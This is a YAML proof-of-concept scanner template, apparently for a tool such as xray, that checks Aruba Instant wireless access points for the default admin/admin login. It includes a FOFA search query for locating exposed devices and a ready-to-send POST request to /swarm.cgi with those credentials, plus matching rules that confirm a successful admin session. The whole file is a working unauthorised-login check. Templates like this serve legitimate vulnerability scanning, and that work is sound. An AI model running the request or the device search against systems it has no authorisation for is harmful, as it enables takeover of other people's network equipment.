id: poc-yaml-aruba-instant-weak-password
info:
  name: Aruba Instant 弱口令漏洞
  severity: high
  tags:
  - 弱口令
  finger: instant
  fofa: body="jscripts/third_party/raphael-treemap.min.js" || body="jscripts/third_party/highcharts.src.js"
requests:
- method: POST
  path: /swarm.cgi
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: opcode=login&user=admin&passwd=admin&refresh=false&nocache=0.17699820340903838
  expression: status_code == 200 && contains(body,"name=\"sid") && contains(body,"true\">Admin")
variables: {}
transport: http
